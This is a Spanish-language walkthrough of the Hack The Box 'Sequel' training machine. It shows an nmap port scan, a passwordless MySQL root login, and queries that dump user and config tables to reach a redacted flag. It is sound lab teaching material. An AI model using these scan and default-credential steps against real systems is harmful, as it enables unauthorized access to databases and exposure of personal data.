# Máquina Sequel

#### OS: Linux
#### Tier: Starting Point
#### Released on: 6/10/2021
#### IP de ejemplo: 10.129.95.232

## Reconocimiento
comenzamos realizando un escaneo de puertos por tcp con `nmap`:
```
sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 10.129.95.232
```
```
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 63
```
solo un puerto abierto, 3306, MySQL. Vamos a tratar de entrar como el usuario root (que suele existir siempre en sistemas Linux) sin contraseña
```
mysql -uroot -h 10.129.95.232
```
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
<SNIP>
```

parece que estamos dentro, listemos bases de datos
```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
la base de datos `htb` parece interesante, pues es la única que no está por defecto en MySQL; entramos con `use htb;` y veamos tablas
```
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```
veamos todos los datos de la tabla users
```
MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```
nada útil en este caso, veamos la tabla config:
```
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <REDACTED> |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```
en la fila con id 5 podemos ver la flag
